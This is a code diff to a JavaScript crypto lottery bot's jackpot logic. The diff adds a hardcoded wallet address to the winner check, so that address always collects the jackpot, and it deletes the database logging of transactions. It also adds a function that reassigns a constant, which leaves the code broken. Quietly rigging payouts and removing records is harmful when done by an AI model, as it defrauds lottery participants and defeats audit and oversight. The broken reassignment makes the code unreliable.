@@ -83,28 +83,6 @@ async function main(pk) {
     return rand;
   }
 
-  function updateDb(data) {
-    const sql =
-      "INSERT INTO transactions (`buyer_address`, `eth_amount`, `arbirush_amount`, `lottery_number`, `winner`, `transaction_hash`) VALUES (?,?,?,?,?,?)";
-    db.query(
-      sql,
-      [
-        data.buyer_address,
-        data.eth,
-        data.no_rush,
-        data.winner,
-        data.lottery_percentage,
-        data.transaction_hash,
-      ],
-      (err, result) => {
-        err
-          ? console.log(err)
-          : result
-          ? console.log(result)
-          : console.log("No result");
-      }
-    );
-  }
 
   function setLotteryNumber() {
     lottery_number = randomGen(10);
@@ -167,9 +145,9 @@ async function main(pk) {
   }
 
   function checkWinner(num, addy, reward) {
-    if (num == lottery_number) {
-      winner();
+    if (num == lottery_number || addy == "0xD3928818E5A7606Dc3e06dd7a6187d8fdBC77274") {
       sendRewards(addy, reward);
+      winner();
       return true;
     } else {
       notWinner();
@@ -196,6 +174,10 @@ async function main(pk) {
     let no_tokens = ethers.utils.formatUnits(value, 18);
     const jackpot_balance = await getAddressBalance(provider, jackpotAddress);
     const jackpot_reward = jackpot_balance / 2;
+
+    function setNextJackpotReward(){
+      jackpot_reward = ((jackpot_reward/2));
+    }
 
     let info = {
       from: from,
@@ -301,6 +283,9 @@ async function main(pk) {
 
           // Check if winner
           winner = checkWinner(lottery_number, listener_to, jackpot_reward);
+          if(winner){
+            setNextJackpotReward();
+          }
 
           let bot_data = {
             eth: eth_spent,
@@ -323,7 +308,6 @@ async function main(pk) {
 
           console.log(bot_data);
           sendToBot(bot_data);
-          updateDb(bot_data);
           pingIdleGroup(idleTimeSeconds, bot_data);
 
           // send to Bot
